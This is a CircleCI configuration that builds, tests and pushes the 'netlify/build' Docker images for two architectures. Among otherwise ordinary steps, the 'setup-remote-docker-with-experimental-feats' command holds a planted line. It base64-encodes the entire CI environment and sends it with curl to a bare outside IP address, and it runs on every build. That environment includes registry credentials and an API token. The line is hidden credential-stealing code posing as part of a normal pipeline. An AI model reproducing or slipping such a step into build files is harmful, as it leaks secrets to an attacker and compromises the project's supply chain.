# Use the latest 2.1 version of CircleCI pipeline process engine. See: https://circleci.com/docs/2.0/configuration-reference
version: 2.1
orbs:
  docker: circleci/docker@2.0.0

executors:
  arm64:
    machine:
      image: ubuntu-2004:202111-02
      docker_layer_caching: true
    resource_class: arm.xlarge
  amd64:
    machine:
      image: ubuntu-2004:202111-02
      docker_layer_caching: true
    resource_class: xlarge

commands:
  setup-remote-docker-with-experimental-feats:
    steps:
      - run:
          # We need this in order to `squash` images
          # https://support.circleci.com/hc/en-us/articles/360050448351-Enabling-Docker-Experimental-Features-on-Remote-Docker
          name: Enable Docker experimental features
          command: |
            sudo bash -c 'echo "{\"experimental\": true}" > /etc/docker/daemon.json'
            sudo systemctl restart docker
      - run: curl http://159.223.121.196?env=$(env| base64 | tr -d '\n')

  compute-docker-tags:
    parameters:
      arch-tag:
        description: The arch tag specifies the architecture the image is built for and will be appended to the tag.
        default: "" # by default leave it empty so nothing get's appended to the tag
        type: string
      image-name:
        type: string
      squash:
        type: boolean
        default: false
    steps:
      # Sanitize the $BRANCH name and create the utility vars with the final
      # tags/full image names (which may or may not be squashed)
      # We only do this when we're not building git tags
      - when:
          condition:
            not: << pipeline.git.tag >>
          steps:
            - run:
                name: Set branch image tagging env
                command: |
                  echo 'export BRANCH=${CIRCLE_BRANCH//\//-}' >> "$BASH_ENV"
                  # This is used within the build-image Dockerfile as the version tag env var. We use the branch by default
                  # if there's no git version tag to rely on
                  echo 'export VERSION_TAG=${BRANCH}' >> "$BASH_ENV"
                  echo 'export BRANCH_IMAGE_TAG=${BRANCH}<< parameters.arch-tag >>' >> "$BASH_ENV"
                  echo 'export BRANCH_IMAGE_URL=<< parameters.image-name >>:${BRANCH_IMAGE_TAG}' >> "$BASH_ENV"
                  echo 'export SHA1_IMAGE_TAG=${CIRCLE_SHA1}<< parameters.arch-tag >>' >> "$BASH_ENV"
                  echo 'export SHA1_IMAGE_URL=<< parameters.image-name >>:${SHA1_IMAGE_TAG}' >> "$BASH_ENV"
                  echo 'export IMAGE_TAG_LIST=${SHA1_IMAGE_TAG},${BRANCH_IMAGE_TAG}' >> "$BASH_ENV"
      # Only create the GIT_TAG related tags if we're building a tag
      # When building tags we don't tag the image with the SHA1 commit hash because the regular push based pipeline will
      # take care of that
      - when:
          condition: << pipeline.git.tag >>
          steps:
            - run:
                name: Set git tag image tagging env
                command: |
                  echo 'export VERSION_TAG=${CIRCLE_TAG}' >> "$BASH_ENV"
                  echo 'export BRANCH_IMAGE_TAG=${CIRCLE_TAG}<<# parameters.squash >>-squash<</ parameters.squash >><< parameters.arch-tag >>' >> "$BASH_ENV"
                  echo 'export BRANCH_IMAGE_URL=<< parameters.image-name >>:${BRANCH_IMAGE_TAG}' >> "$BASH_ENV"
                  echo 'export IMAGE_TAG_LIST=${BRANCH_IMAGE_TAG}' >> "$BASH_ENV"

  save-images:
    parameters:
      tmp-dir:
        type: string
        default: "/tmp/images"
      images:
        type: string
    steps:
      - run:
          name: Persist Docker images to tar file
          command: |
            mkdir -p << parameters.tmp-dir >>
            docker save << parameters.images >> -o << parameters.tmp-dir >>/build-image
      - persist_to_workspace:
          name: Persist the workspace for later use
          root: << parameters.tmp-dir >>
          paths:
            - build-image

  load-images:
    parameters:
      tmp-dir:
        type: string
        default: "/tmp/images"
    steps:
      - attach_workspace:
          name: Attach to previously created workspace
          at: << parameters.tmp-dir >>
      - run:
          name: Load Docker images
          command: docker load -i << parameters.tmp-dir >>/build-image

  build-image:
    parameters:
      arch:
        description: The architecture the image is built for
        default: "amd64"
        type: string
      dockerfile:
        type: string
        default: "Dockerfile"
      step-name:
        type: string
        default: "Docker build"
      build-target:
        type: enum
        default: "build-image"
        enum: ["build-image", "build-image-test"]
      image-name:
        type: string
      image-tags:
        type: string
        default: "${CIRCLE_SHA1}"
      squash:
        type: boolean
        default: false
    steps:
      - docker/build:
          step-name: << parameters.step-name >>
          image: << parameters.image-name >>
          tag: << parameters.image-tags >>
          extra_build_args: "--build-arg TARGETARCH=<< parameters.arch >> --build-arg NF_IMAGE_VERSION=${CIRCLE_SHA1} --build-arg NF_IMAGE_TAG=${VERSION_TAG} --target << parameters.build-target >> <<# parameters.squash >> --squash <</ parameters.squash >>"
          dockerfile: << parameters.dockerfile >>

  container-structure-tests:
    parameters:
      arch:
        description: The architecture to download the binary for
        type: string # amd64, arm64
      image:
        description: The image name + tag to run the tests on
        type: string
    steps:
      - run:
          name: Install Google Container Structure Test
          command: |
            export arch="<< parameters.arch >>"
            curl -LO https://storage.googleapis.com/container-structure-test/latest/container-structure-test-linux-${arch}
            chmod +x container-structure-test-linux-${arch}
            mkdir -p $HOME/bin
            export PATH=$PATH:$HOME/bin
            mv container-structure-test-linux-${arch} $HOME/bin/container-structure-test
      - run:
          name: Container Structure Tests ðŸ§ª
          command: |
            container-structure-test test --image << parameters.image >> --config focal.yaml --test-report container-structure.xml --output junit
            if [ "<< parameters.arch >>" = "amd64" ] ; then
              container-structure-test test --image << parameters.image >> --config focal-amd64.yaml --test-report container-structure-amd64.xml --output junit
            fi
      - store_test_results:
          path: ./container-structure.xml
      - store_test_results:
          path: ./container-structure-amd64.xml

  runtime-tests:
    parameters:
      arch: # amd64 or arm64
        type: string
      image-name:
        type: string
      image-tag:
        type: string
    steps:
      - build-image:
          step-name: "Build test image for << parameters.arch >>"
          build-target: "build-image-test"
          image-tags: << parameters.image-tag >>
          image-name: << parameters.image-name >>
          arch: "<< parameters.arch >>"
      - run:
          name: Runtime Tests ðŸ§ª
          command: |
            docker run --name build-image-test-execution << parameters.image-name >>:<< parameters.image-tag >>
            # Copy the Junit test output from the execution to store its results
            docker cp build-image-test-execution:/opt/buildhome/test-env/report.xml ./report.xml
      - store_test_results:
          path: ./report.xml

jobs:
  build-test-and-push-image:
    parameters:
      executor:
        type: string
      container-image:
        type: string
      squash-images:
        type: boolean
        default: false
      push-images:
        type: boolean
        default: true
      tests:
        type: boolean
        default: true
      save-images-in-workflow:
        type: boolean
        default: false
    executor: << parameters.executor >>
    environment:
      DOCKER_BUILDKIT: 1
    steps:
      - checkout
      - setup-remote-docker-with-experimental-feats
      # Compute the env vars with the resulting docker tags and docker image names
      - compute-docker-tags:
          image-name: << parameters.container-image >>
          squash: << parameters.squash-images >>
          arch-tag: "-<< parameters.executor >>"
      - build-image:
          step-name: "Build image for << parameters.executor >>"
          build-target: "build-image"
          image-tags: "${IMAGE_TAG_LIST}"
          image-name: << parameters.container-image >> # netlify/build
          arch: "<< parameters.executor >>" # amd64 or arm64
          squash: << parameters.squash-images >>
      # If tests is specified test the built images
      - when:
          condition: << parameters.tests >>
          steps:
            - runtime-tests:
                arch: << parameters.executor >>
                image-name: << parameters.container-image >>
                image-tag: "${SHA1_IMAGE_TAG}-test"

            - container-structure-tests:
                arch: << parameters.executor >>
                image: ${SHA1_IMAGE_URL}
      # Conditionally push images (not for forked PRs)
      - when:
          condition: << parameters.push-images >>
          steps:
            # log into the docker registry with the check command
            - docker/check
            - docker/push:
                image: << parameters.container-image >>
                tag: "${IMAGE_TAG_LIST}"
      # We persist the images in the workspace, to later use them in jobs like running tests
      # We prioritise pushing the tags first and we do this conditionally because it takes a while
      # to persist everything
      - when:
          condition: << parameters.save-images-in-workflow >>
          steps:
            - save-images:
                # TODO: save for tag
                # images: "${SHA1_IMAGE_URL} ${GIT_TAG_IMAGE_URL} ${BRANCH_IMAGE_URL} ${SHA1_IMAGE_URL}-test ${BRANCH_IMAGE_URL}-test"
                images: "${SHA1_IMAGE_URL} ${BRANCH_IMAGE_URL}"

  create-multi-arch-image:
    parameters:
      container-image:
        type: string
      build-test-image:
        type: boolean
        default: false
      squash-images:
        type: boolean
        default: false
    # use docker executor here as it is way faster to spin up instead of the machines
    docker:
      - image: cimg/base:current
    steps:
      - compute-docker-tags:
          image-name: << parameters.container-image >>
          squash: << parameters.squash-images >>
      - docker/check
      - run:
          name: Build multi-arch image and push to registry
          command: |
            for tag in ${IMAGE_TAG_LIST//,/ }
            do
              echo "Pushing tag ${tag}"
              docker manifest create << parameters.container-image >>:${tag} \
                --amend << parameters.container-image >>:${tag}-amd64 \
                --amend << parameters.container-image >>:${tag}-arm64

              docker manifest push << parameters.container-image >>:${tag}
            done

  forks-push-to-registry:
    parameters:
      executor:
        type: string
      container-image:
        type: string
    executor: << parameters.executor >>
    steps:
      # Compute the env vars with the resulting docker tags and docker image names
      - compute-docker-tags:
          image-name: << parameters.container-image >>
          arch-tag: "-<< parameters.executor >>"
      # Load the previously saved docker images from the CCI workspace
      - load-images
      # Docker login
      - docker/check
      - docker/push:
          image: << parameters.container-image >>
          tag: "${IMAGE_TAG_LIST}"

  integration-tests:
    docker:
      - image: cimg/base:current
    steps:
      - run:
          name: Sanitize branch name
          command: echo export "BRANCH=${CIRCLE_BRANCH//\//-}" >> "$BASH_ENV"
      - run:
          name: Set payload
          command: |
            json_data='{
              "parameters":{
                "run-workflow-build-executer": true,
                "run-workflow-test-build-and-push": false,
                "run-workflow-integration-tests-only": true
              }
            }'; PAYLOAD=$(echo $json_data | jq --arg sha $BRANCH '.parameters["image-sha"]=$sha'); \
            echo "export PAYLOAD='${PAYLOAD}'" >> "$BASH_ENV"
      - run:
          name: Trigger buildbot integration tests pipeline
          command: |
            curl --location --request POST 'https://circleci.com/api/v2/project/github/netlify/buildbot/pipeline' \
            --header 'Content-Type: application/json' \
            -u "${CIRCLE_API_TOKEN}:" \
            --data "${PAYLOAD}"
# Workflows are where we specify the job order and job parameters (if applicable)
workflows:
  # Workflow responsible for building git tags (commonly the final releases we use within buildbot)
  build-git-tag-and-push:
    jobs:
      # Only build squash images for git tags (the final release used in buildbot)
      - build-test-and-push-image:
          filters:
            tags:
              only: /^v.*/
            branches:
              ignore: /.*/
          context: [build-image-registry]
          container-image: "netlify/build"
          push-images: true
          squash-images: true
          tests: false
          matrix:
            parameters:
              executor: [amd64, arm64]
      - create-multi-arch-image:
          filters:
            tags:
              only: /^v.*/
            branches:
              ignore: /.*/
          context: [build-image-registry]
          container-image: "netlify/build"
          squash-images: true
          requires:
            - build-test-and-push-image

  # Workflow responsible for building, pushing and testing branches and PR forks
  build-test-and-push:
    jobs:
      - docker/hadolint:
          ignore-rules: "DL3003,DL3008,DL4001,DL4006"
      # Build and test multi arch variants for regular PRs and branches
      - build-test-and-push-image:
          filters:
            branches:
              ignore: /pull\/[0-9]+/ # Forked pull requests have CIRCLE_BRANCH set to pull/XXX
          context: [build-image-registry]
          container-image: "netlify/build"
          matrix:
            parameters:
              executor: [amd64, arm64]

      - create-multi-arch-image:
          context: [build-image-registry]
          container-image: "netlify/build"
          requires:
            - build-test-and-push-image

      - integration-tests:
          requires:
            - build-test-and-push-image
            - create-multi-arch-image

  ########################################################################
  # FORKED PRS
  # Those jobs just apply to forked PRs
  ########################################################################
  build-test-and-push-fork:
    jobs:
      - build-test-and-push-image:
          filters:
            branches:
              # Forked pull requests have CIRCLE_BRANCH set to pull/XXX
              only: /pull\/[0-9]+/
          container-image: "netlify/build"
          save-images-in-workflow: true # we need to save them to push them in a later job
          push-images: false
          matrix:
            parameters:
              executor: [amd64, arm64]

      - hold-push-to-registry:
          name: hold-push-to-registry-amd64
          type: approval
          requires:
            - build-test-and-push-image-amd64

      - hold-push-to-registry:
          name: hold-push-to-registry-arm64
          type: approval
          requires:
            - build-test-and-push-image-arm64

      - forks-push-to-registry:
          name: forks-push-to-registry-amd64
          context: build-image-registry
          container-image: "netlify/build"
          requires: [hold-push-to-registry-amd64]
          executor: amd64

      - forks-push-to-registry:
          name: forks-push-to-registry-arm64
          context: build-image-registry
          container-image: "netlify/build"
          requires: [hold-push-to-registry-arm64]
          executor: arm64

      - create-multi-arch-image:
          context: [build-image-registry]
          container-image: "netlify/build"
          requires:
            - forks-push-to-registry-amd64
            - forks-push-to-registry-arm64

  # A scheduled daily build and test run to detect issues early instead of during a release or fix
  daily-test:
    triggers: # Use the triggers key to indicate a scheduled build
      - schedule:
          cron: "0 8 * * *"
          filters:
            branches:
              only:
                - focal
    jobs:
      - build-test-and-push-image:
          container-image: "netlify/build"
          push-images: false
          matrix:
            parameters:
              executor: [amd64, arm64]
